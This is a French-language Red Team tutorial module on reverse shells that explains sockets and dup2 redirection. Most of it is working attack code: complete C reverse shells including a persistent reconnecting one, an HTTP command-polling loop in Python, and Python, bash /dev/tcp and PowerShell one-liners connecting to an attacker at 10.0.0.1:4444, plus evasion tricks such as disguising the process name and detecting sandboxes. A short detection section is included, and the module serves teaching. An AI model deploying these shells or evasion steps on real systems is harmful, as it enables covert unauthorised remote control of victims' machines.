# Module 26 : Reverse Shell

## 🎯 Ce que tu vas apprendre

- C'est quoi un reverse shell et pourquoi c'est crucial en Red Team
- Comment fonctionnent les sockets réseau en C (socket, connect, bind)
- La différence entre reverse shell et bind shell
- Comment rediriger stdin/stdout/stderr avec dup2()
- Créer un reverse shell complet en C
- Techniques d'évasion et de persistence

## 📚 Théorie

### Concept 1 : C'est quoi un Shell ?

**C'est quoi ?**
Un shell est un interpréteur de commandes qui te permet d'interagir avec le système d'exploitation. Exemples : `/bin/bash`, `/bin/sh`, `cmd.exe`, `powershell.exe`.

**Pourquoi c'est crucial ?**
Quand tu exploites une vulnérabilité, obtenir un shell = avoir un accès interactif au système, comme si tu étais physiquement devant la machine.

**Shell normal (local)** :

```
┌─────────────┐
│ Utilisateur │  Tape au clavier
│     👤      │  Voit l'écran
│             │
│  Terminal   │  ← Shell local
│  $ whoami   │
│  user       │
└─────────────┘
```

### Concept 2 : Reverse Shell vs Bind Shell

**Bind Shell (Shell lié)** :

La **victime écoute** sur un port et l'**attaquant se connecte**.

```
VICTIME (192.168.1.50)            ATTAQUANT
┌──────────────┐                  ┌──────────────┐
│ bind(4444)   │ ← Écoute port    │              │
│ listen()     │                  │              │
│ accept()     │                  │              │
│   ↓          │                  │   ↓          │
│ Attend...    │  ←──connect()──  │ nc IP 4444   │
│   ↓          │                  │   ↓          │
│ /bin/sh      │  ←──commandes──  │ whoami       │
│   ↓          │  ──résultats──→  │ root         │
└──────────────┘                  └──────────────┘

❌ PROBLÈME : Firewall entrant bloque souvent
```

**Reverse Shell (Shell inversé)** :

L'**attaquant écoute** et la **victime se connecte**.

```
ATTAQUANT (10.0.0.1)              VICTIME (192.168.1.50)
┌──────────────┐                  ┌──────────────┐
│ nc -l 4444   │ ← Écoute         │              │
│   ↓          │                  │ Exploité     │
│ Attend...    │  ──connect()───  │ connect(IP)  │
│   ↓          │                  │   ↓          │
│ Reçoit shell │  ←────/bin/sh──  │ dup2()       │
│ $ whoami     │  ──commandes──→  │ execve()     │
│ root         │  ←──résultats──  │              │
└──────────────┘                  └──────────────┘

✅ BYPASS : Firewall sortant moins strict (comme HTTP/HTTPS)
```

**Pourquoi "Reverse" ?**
Normalement, le client se connecte au serveur. Ici, c'est l'inverse : la victime (client) initie la connexion vers l'attaquant (serveur). Ça bypass les firewalls qui bloquent les connexions entrantes mais autorisent les connexions sortantes.

**Tableau comparatif** :

| Aspect | Bind Shell | Reverse Shell |
|--------|------------|---------------|
| **Qui écoute** | Victime | Attaquant |
| **Qui connecte** | Attaquant | Victime |
| **Firewall** | Souvent bloqué | Passe souvent |
| **NAT** | Problématique | Fonctionne |
| **Furtivité** | Moins furtif | Plus furtif |
| **Utilisation** | Rare (backdoor) | Standard (post-exploit) |

### Concept 3 : Les Sockets - Communication Réseau

**C'est quoi ?**
Un socket est un point de communication réseau. C'est comme une "prise électrique" pour le réseau.

**Visualisation** :

```
ORDINATEUR A              Réseau              ORDINATEUR B
┌──────────────┐                            ┌──────────────┐
│  Programme   │                            │  Programme   │
│      ↓       │                            │      ↓       │
│   Socket 1   │ ════════════════════════ │   Socket 2   │
│  (IP:Port)   │       TCP/IP              │  (IP:Port)   │
└──────────────┘                            └──────────────┘
192.168.1.10:4444                           192.168.1.20:8080
```

**Socket = IP + Port** :
- **IP** : Identifie la machine (adresse de la maison)
- **Port** : Identifie l'application (numéro d'appartement)

**Créer un socket en C** :

```c
int sock = socket(AF_INET, SOCK_STREAM, 0);
                   │        │          │
                   │        │          └─ Protocole (0 = auto)
                   │        └─ Type : STREAM = TCP
                   └─ Famille : INET = IPv4
```

**Que fait socket() ?**

```
AVANT socket() :
Descripteurs de fichiers :
┌───┬──────┐
│ 0 │ stdin│
│ 1 │stdout│
│ 2 │stderr│
└───┴──────┘

APRÈS sock = socket(...) :
┌───┬──────┐
│ 0 │ stdin│
│ 1 │stdout│
│ 2 │stderr│
│ 3 │socket│  ← Nouveau file descriptor
└───┴──────┘
    ↑
  sock = 3

Le socket est traité comme un fichier !
read(sock, ...) / write(sock, ...)
```

**Structure sockaddr_in** :

```c
struct sockaddr_in {
    short sin_family;        // AF_INET (IPv4)
    unsigned short sin_port; // Port (network byte order)
    struct in_addr sin_addr; // Adresse IP
    char sin_zero[8];        // Padding (remplissage)
};
```

**Remplir la structure** :

```c
struct sockaddr_in server;
server.sin_family = AF_INET;
server.sin_port = htons(4444);  // htons = host to network short
server.sin_addr.s_addr = inet_addr("10.0.0.1");
```

**Visualisation de la structure** :

```
┌─────────────────────────────────────┐
│  struct sockaddr_in server          │
├─────────────────────────────────────┤
│  sin_family : AF_INET (2)           │  2 bytes
├─────────────────────────────────────┤
│  sin_port : 4444                    │  2 bytes
│  (0x115C en network byte order)    │
├─────────────────────────────────────┤
│  sin_addr : 10.0.0.1                │  4 bytes
│  (0x0A000001)                       │
├─────────────────────────────────────┤
│  sin_zero : \0\0\0\0\0\0\0\0        │  8 bytes
└─────────────────────────────────────┘
Total : 16 bytes
```

### Concept 4 : Redirection avec dup2()

**C'est quoi ?**
`dup2()` duplique un file descriptor vers un autre. Ça permet de rediriger stdin/stdout/stderr vers le socket.

**Pourquoi ?**
Le shell (`/bin/sh`) lit les commandes depuis stdin et écrit les résultats vers stdout. En redirigeant ces descripteurs vers le socket, le shell communique avec l'attaquant au lieu du terminal local.

**Comment ça marche ?**

```
AVANT dup2(sock, 0) :

File Descriptors :
┌───┬──────────┐
│ 0 │ stdin    │  ← Lit depuis clavier
│ 1 │ stdout   │  ← Écrit vers écran
│ 2 │ stderr   │  ← Erreurs vers écran
│ 3 │ socket   │  ← Connecté au réseau
└───┴──────────┘

APRÈS dup2(sock, 0) :
┌───┬──────────┐
│ 0 │ socket   │  ← stdin redirigé vers socket !
│ 1 │ stdout   │
│ 2 │ stderr   │
│ 3 │ socket   │
└───┴──────────┘

APRÈS dup2(sock, 1) et dup2(sock, 2) :
┌───┬──────────┐
│ 0 │ socket   │  ← Tout redirigé
│ 1 │ socket   │     vers le socket
│ 2 │ socket   │
│ 3 │ socket   │
└───┴──────────┘

RÉSULTAT :
- Quand /bin/sh lit stdin  → Lit depuis socket (attaquant)
- Quand /bin/sh écrit stdout → Écrit vers socket (attaquant)
- Tout passe par le réseau !
```

**Visualisation du flux** :

```
ATTAQUANT tape "whoami" :

ATTAQUANT                          VICTIME
┌──────────────┐                   ┌──────────────┐
│ nc -l 4444   │                   │  /bin/sh     │
│ $ whoami     │ ──Socket 3────────→│ stdin (fd 0) │
└──────────────┘                   │      ↓       │
                                   │   Exécute    │
                                   │      ↓       │
┌──────────────┐                   │ stdout (fd 1)│
│ nc -l 4444   │ ←──Socket 3────────│ "root\n"     │
│ root         │                   └──────────────┘
└──────────────┘

Les données transitent via le socket dans les DEUX sens
```

## 🔍 Visualisation : Architecture Complète d'un Reverse Shell

```
┌──────────────────────────────────────────────────────┐
│                  ATTAQUANT (10.0.0.1)                │
├──────────────────────────────────────────────────────┤
│  Terminal 1 : Listener                              │
│  $ nc -lvp 4444                                      │
│  Listening on 0.0.0.0 4444                           │
│    ↓                                                 │
│  [Attend connexion...]                               │
└───────────────────────┬──────────────────────────────┘
                        │
                        │ Internet/Réseau
                        │
┌───────────────────────┴──────────────────────────────┐
│                VICTIME (192.168.1.50)                │
├──────────────────────────────────────────────────────┤
│  Programme vulnérable exploité                       │
│    ↓                                                 │
│  Shellcode reverse shell s'exécute :                 │
│  ├─ socket()       : Crée un socket                  │
│  ├─ connect()      : Connecte vers 10.0.0.1:4444     │
│  ├─ dup2(sock, 0)  : Redirige stdin                  │
│  ├─ dup2(sock, 1)  : Redirige stdout                 │
│  ├─ dup2(sock, 2)  : Redirige stderr                 │
│  └─ execve()       : Lance /bin/sh                   │
└──────────────────────────────────────────────────────┘
                        │
                        ↓ Connection établie
┌──────────────────────────────────────────────────────┐
│                  ATTAQUANT                           │
├──────────────────────────────────────────────────────┤
│  $ nc -lvp 4444                                      │
│  Connection from 192.168.1.50                        │
│  $ whoami                                            │
│  root                                                │
│  $ ls                                                │
│  secret.txt                                          │
│  $                                                   │
└──────────────────────────────────────────────────────┘

SCÉNARIO : L'attaquant tape "ls"

┌─────────────────────────────────────────────────────────┐
│  ÉTAPE PAR ÉTAPE                                         │
└─────────────────────────────────────────────────────────┘

ATTAQUANT (10.0.0.1)           RÉSEAU           VICTIME (192.168.1.50)
┌──────────────┐                               ┌──────────────┐
│ nc -l 4444   │                               │              │
│ $ ls         │ ─┐                            │              │
│ (tape)       │  │                            │              │
└──────────────┘  │                            └──────────────┘
                  │ Paquet TCP
                  │ ┌──────────────────┐
                  └→│ "ls\n"           │
                    │ Source: attaquant│
                    │ Dest: victime    │
                    └─────────┬────────┘
                              ↓
┌──────────────┐        Socket (fd 3)          ┌──────────────┐
│              │                               │ Reçoit "ls\n"│
│              │                               │      ↓       │
│              │                               │   stdin (0)  │
│              │                               │      ↓       │
│              │                               │   /bin/sh    │
│              │                               │   exécute ls │
│              │                               │      ↓       │
│              │                               │  stdout (1)  │
│              │                               │  "file1      │
│              │                               │   file2"     │
│              │                               │      ↓       │
│              │        Paquet TCP             │  Socket (3)  │
│              │    ┌──────────────────┐       │      │       │
│              │  ←─│ "file1\nfile2\n" │←──────┘      │       │
│              │    │ Source: victime  │              │       │
│              │    │ Dest: attaquant  │              │       │
│              │    └──────────────────┘              │       │
│ Reçoit :     │                               └──────────────┘
│ file1        │
│ file2        │
│ $            │
└──────────────┘

Le shell distant fonctionne comme si l'attaquant
était physiquement devant la machine !
```

## 💻 Exemple pratique

### Reverse Shell complet en C

```c
// reverse_shell.c
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    // ═══════════════════════════════════════════
    // ÉTAPE 1 : Créer un socket TCP
    // ═══════════════════════════════════════════
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        return 1;  // Échec
    }

    // ═══════════════════════════════════════════
    // ÉTAPE 2 : Configurer l'adresse de l'attaquant
    // ═══════════════════════════════════════════
    struct sockaddr_in attacker;
    attacker.sin_family = AF_INET;                     // IPv4
    attacker.sin_port = htons(4444);                   // Port de l'attaquant
    attacker.sin_addr.s_addr = inet_addr("10.0.0.1"); // IP attaquant

    // ═══════════════════════════════════════════
    // ÉTAPE 3 : Se connecter à l'attaquant
    // ═══════════════════════════════════════════
    if (connect(sock, (struct sockaddr *)&attacker, sizeof(attacker)) != 0) {
        return 1;  // Connexion échouée
    }

    // ═══════════════════════════════════════════
    // ÉTAPE 4 : Rediriger stdin/stdout/stderr vers le socket
    // ═══════════════════════════════════════════
    dup2(sock, 0);  // stdin  → socket (lit les commandes depuis l'attaquant)
    dup2(sock, 1);  // stdout → socket (envoie les résultats à l'attaquant)
    dup2(sock, 2);  // stderr → socket (envoie les erreurs à l'attaquant)

    // ═══════════════════════════════════════════
    // ÉTAPE 5 : Lancer un shell
    // ═══════════════════════════════════════════
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
    // execve() ne retourne jamais si succès

    return 0;
}
```

**Compilation et test** :

```bash
# Sur la machine victime
gcc -o reverse_shell reverse_shell.c

# Sur la machine attaquant
nc -lvp 4444

# Sur la machine victime
./reverse_shell

# Sur la machine attaquant → Shell reçu !
```

### Version avec persistance et reconnexion

```c
// persistent_reverse_shell.c
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    struct sockaddr_in attacker;
    attacker.sin_family = AF_INET;
    attacker.sin_port = htons(4444);
    attacker.sin_addr.s_addr = inet_addr("10.0.0.1");

    // Boucle infinie de reconnexion
    while (1) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1) {
            sleep(5);  // Attendre avant de réessayer
            continue;
        }

        // Essayer de se connecter
        if (connect(sock, (struct sockaddr *)&attacker, sizeof(attacker)) != 0) {
            close(sock);
            sleep(5);  // Attendre 5 secondes avant de réessayer
            continue;
        }

        // Connexion réussie : redirection et shell
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        execve("/bin/sh", NULL, NULL);

        // Si execve échoue, on réessaie
        close(sock);
        sleep(5);
    }

    return 0;
}
```

**Avantages** :
- Si connexion coupée → Reconnexion automatique toutes les 5 secondes
- Si l'attaquant redémarre son listener → Le reverse shell se reconnecte
- Persistence même après reboot (si lancé au démarrage)

### Reverse shell avec encryption (SSL/TLS)

```c
// Concept : Chiffrer le trafic pour éviter la détection IDS
// Nécessite OpenSSL

#include <openssl/ssl.h>
#include <openssl/err.h>

int main() {
    // Setup SSL
    SSL_library_init();
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());

    // Socket classique
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in attacker = { /* ... */ };
    connect(sock, (struct sockaddr *)&attacker, sizeof(attacker));

    // Wrapper SSL
    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    SSL_connect(ssl);

    // Redirection (dup2 avec SSL serait via un wrapper)
    // ... (plus complexe, nécessite un proxy local)

    return 0;
}
```

## 🎯 Application Red Team

### 1. Post-exploitation standard

**Scénario** : Tu as exploité un buffer overflow, ton shellcode s'exécute

```
1. RECONNAISSANCE
   ├─ nmap 192.168.1.0/24
   └─ Trouver cible : 192.168.1.50

2. EXPLOITATION
   ├─ Buffer overflow détecté
   └─ Créer exploit avec reverse shell payload

3. LISTENER
   ├─ nc -lvp 4444 (sur machine attaquant)
   └─ Attendre connexion

4. EXPLOITATION
   ├─ Envoyer exploit
   └─ Shellcode reverse shell s'exécute

5. SHELL REÇU
   ├─ $ whoami → root
   ├─ Escalade privilèges si besoin
   ├─ Persistence (cron, .bashrc)
   └─ Lateral movement
```

### 2. Bypass de firewall avec reverse shell HTTP/HTTPS

**Problème** : Le firewall bloque les connexions sortantes sur les ports non standard (4444, 1337, etc.)

**Solution** : Utiliser le port 80 (HTTP) ou 443 (HTTPS) qui sont souvent autorisés

```c
// Reverse shell sur port 443 (HTTPS)
struct sockaddr_in attacker;
attacker.sin_port = htons(443);  // Port HTTPS
// Le firewall pense que c'est du trafic HTTPS légitime
```

**Encore mieux : Tunneling HTTP** :

```python
# Sur victime : Envoyer commandes via HTTP POST
import requests

while True:
    cmd = requests.get("http://10.0.0.1/cmd").text
    result = os.popen(cmd).read()
    requests.post("http://10.0.0.1/result", data=result)
```

### 3. Reverse shell stageless vs staged

**Stageless (tout en un)** :

```c
// Tout le code dans le shellcode initial
// Avantage : Une seule connexion
// Inconvénient : Gros shellcode (peut ne pas tenir dans le buffer)
unsigned char shellcode[] = { /* 500 bytes de reverse shell complet */ };
```

**Staged (en plusieurs étapes)** :

```
ÉTAPE 1 : Petit shellcode initial (50 bytes)
├─ Ouvre socket
├─ Télécharge le vrai payload (stage 2)
└─ Exécute stage 2

ÉTAPE 2 : Payload complet
├─ Reverse shell
├─ Meterpreter
└─ Persistence

Avantage : Petit shellcode initial (tient dans petits buffers)
Inconvénient : 2 connexions (plus détectable)
```

### 4. Evasion de détection

**Techniques** :

```c
// 1. Changer le nom du processus
strcpy(argv[0], "systemd-logind");  // Se faire passer pour un processus système

// 2. Fork et détachement
if (fork() == 0) {
    // Processus enfant : reverse shell
    setsid();  // Nouvelle session (détaché du terminal)
    // ... reverse shell ...
}
// Parent se termine → Enfant devient orphelin (parent = init)

// 3. Timing aléatoire
sleep(rand() % 300);  // Attendre 0-5 minutes avant connexion

// 4. Vérifier si dans sandbox/VM
if (is_sandbox()) {
    exit(0);  // Ne pas se connecter si détection
}
```

### 5. Détection et prévention

**Indicateurs de compromission** :

```bash
# 1. Connexions sortantes suspectes
netstat -an | grep ESTABLISHED
# tcp   0   0 192.168.1.50:54321 10.0.0.1:4444 ESTABLISHED
#                └─────────────┘ └─────────┘
#                  Machine        IP externe suspecte

# 2. Processus avec stdin/stdout/stderr vers socket
lsof -i -n | grep "/bin/sh"
# sh  1234  user  0u  IPv4  12345  TCP 192.168.1.50:54321->10.0.0.1:4444

# 3. File descriptors anormaux
ls -l /proc/1234/fd/
# 0 -> socket:[12345]  ← stdin vers socket ❌
# 1 -> socket:[12345]  ← stdout vers socket ❌
# 2 -> socket:[12345]  ← stderr vers socket ❌
```

**Protections** :

```
┌──────────────────┬────────────────────────────┐
│ Protection       │ Comment ça aide            │
├──────────────────┼────────────────────────────┤
│ Firewall sortant │ Bloque connexions externes │
│ SELinux/AppArmor │ Restreint execve()         │
│ IDS/IPS (Snort)  │ Détecte patterns shellcode │
│ EDR (Endpoint)   │ Alerte sur shells          │
│ Sandboxing       │ Isole processus suspects   │
└──────────────────┴────────────────────────────┘
```

### 6. Variantes de reverse shell

**En Python (plus furtif, présent sur beaucoup de systèmes)** :

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

**One-liner bash** :

```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

**PowerShell (Windows)** :

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
$client.Close()
```

## 📝 Points clés à retenir

- Reverse shell : La victime se connecte à l'attaquant (bypass firewall)
- Bind shell : La victime écoute, l'attaquant se connecte (souvent bloqué)
- Socket = File descriptor → Traité comme un fichier
- `dup2(sock, 0/1/2)` redirige stdin/stdout/stderr vers le socket
- `execve("/bin/sh")` lance le shell qui communique via le socket
- Port 80/443 pour bypass firewall (simule trafic HTTP/HTTPS)
- Persistence : Boucle de reconnexion + lancement au démarrage
- Évasion : Fork, détachement, changement nom processus, timing aléatoire
- Détection : netstat, lsof, analyse file descriptors
- Variantes : C, Python, Bash, PowerShell selon la cible

## ➡️ Prochaine étape

Maintenant que tu maîtrises le reverse shell x86-64, tu vas apprendre l'[Architecture ARM64](../29_arm64_architecture/) pour exploiter les Mac M1/M2/M3 et les devices mobiles.

---

**Exercices** : Voir [exercice.txt](exercice.txt)
**Code exemple** : Voir [example.c](example.c)
